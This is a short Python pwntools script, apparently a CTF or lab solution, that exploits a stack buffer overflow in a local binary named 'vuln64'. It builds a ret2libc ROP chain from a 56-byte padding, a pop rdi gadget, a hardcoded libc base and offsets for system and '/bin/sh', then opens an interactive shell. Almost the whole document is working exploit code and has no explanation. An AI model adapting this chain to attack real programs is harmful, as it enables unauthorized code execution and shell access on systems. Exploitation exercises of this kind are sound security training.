# padding --> 56
# pop rdi --> 0x00000000004011cb
# libc base address --> 0x00007ffff7c00000
# system offset --> 0x04a490
# '/bin/sh' offset --> 0x1b3115

from pwn import *

p = process('./vuln64')

print(p.recv())

libc_base_address = 0x00007ffff7c00000
padding = b'A'*56
pop_rdi = p64(0x00000000004011cb)
param = p64(libc_base_address+0x1b3115)
system = p64(libc_base_address+0x04a490)

p.sendline(padding+pop_rdi+param+system)

print(p.clean())

p.interactive()
